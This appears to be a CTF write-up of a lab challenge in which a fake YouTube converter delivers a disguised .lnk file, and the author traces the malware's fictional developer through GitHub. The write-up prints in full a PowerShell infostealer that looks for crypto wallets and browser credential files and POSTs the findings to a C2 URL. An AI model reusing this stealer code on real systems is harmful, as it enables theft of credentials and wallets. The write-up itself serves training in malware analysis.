There is a hosted website that appears to be a converter called "The Glitch's All-in-One Converter".

Enter YouTube URL and press convert. 

Unzipping the download.zip produces two files song.mp3 and somg.mp3. 

`````
# Inspect file type
file somg.mp3 

# Result
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
`````

The somg.mp3 appears to be a MS lnk file - a file type that can be used to launch programs for example.

Exiftool exposes the contents of the lnk file. In short it appears to download and run a malicious Powershell script. 

`````
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
`````

The script attempts to steal crypto wallets and credentials stored in Firefox and Chrome browsers and then send that information to a C2 server at http://papash3ll.thm/data. 

Who is the developer? In the malicious script there is a lead that can be searched for: "Created by the one and only M.M". Running the search in DuckDuckGo revelead the GitHub page below:

# The conversation between MM-WarevilleTHM and Bloatware-WarevilleTHM on Oct 30, 2024

# 1
Hey Bloatware,

I came across this pretty cool C++ script of yours and would like to use it for Wareville. My only issue is that I'm not too good with C++ and I donâ€™t really vibe. Iâ€™m much more comfortable with PowerShell.

The code does some interesting things, like searching for wallet and browser credential files and sending the findings to a C2 server. Iâ€™d love to cross-check my PowerShell version of this, especially since my C++ skills are about as sharp as a butter knife these days.

Appreciate any guidance! Please save me from pointer madness ðŸ˜….

Hey MM, Thanks for the shoutout. Haha, I totally get it! Pointers and memory management can feel like trying to defuse a bomb with a toothpick.

Iâ€™m guessing itâ€™s the file searching and C2 communication thatâ€™s got you sweating. Share your code, and we'll see what we have.

The threat actors' conversation revelead the developer of the script. Further inspection of GitHub points to another project of MM's https://github.com/MM-WarevilleTHM/M.M. 

The threat actor's name is Mayor Malware (lol :D).
